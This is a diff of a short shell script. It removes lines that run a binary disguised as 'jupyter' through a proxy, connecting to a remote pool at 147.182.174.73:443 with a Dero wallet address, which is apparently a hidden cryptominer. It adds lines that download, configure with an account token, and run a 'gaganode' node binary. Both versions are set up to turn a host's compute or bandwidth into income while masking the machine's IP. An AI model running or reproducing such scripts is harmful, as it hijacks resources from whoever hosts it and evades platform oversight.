@@ -1,5 +1,3 @@
-chmod +x proxychains.conf jupyter proxy libproxychains4.so proxychains.conf compile.sh
-echo "IP ORI ==> "$(curl ifconfig.me)
-echo "IP Baru ==> "$(./proxy curl ifconfig.me)
-./proxy ./jupyter -r 147.182.174.73:443 -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr.BRH2
-
+curl -o app-linux-amd64.tar.gz https://assets.coreservice.io/public/package/29/gaganode/1.0.4/gaganode-1_0_4.tar.gz && tar -zxf app-linux-amd64.tar.gz
+cd gaganode-linux-amd64 && ./gaganode config set --token=sxtdppquataoqandymfdiktn
+./gaganode
